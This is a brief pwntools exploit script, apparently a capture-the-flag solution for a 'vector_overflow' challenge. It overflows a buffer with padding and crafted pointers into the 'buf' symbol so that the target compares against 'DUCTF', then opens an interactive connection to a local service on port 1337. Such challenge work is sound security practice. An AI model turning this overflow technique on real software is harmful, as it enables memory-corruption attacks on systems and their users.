from pwn import *

exe = ELF("../src/vector_overflow")
buf = exe.sym['buf']

# conn = process([exe.path])
conn = remote('0.0.0.0', 1337)
conn.sendline(b'x' * 16 + p64(buf + 0x30) + p64(buf + 0x35) + p64(buf + 0x35) + b'x' * 8 + b'DUCTF')
conn.interactive()
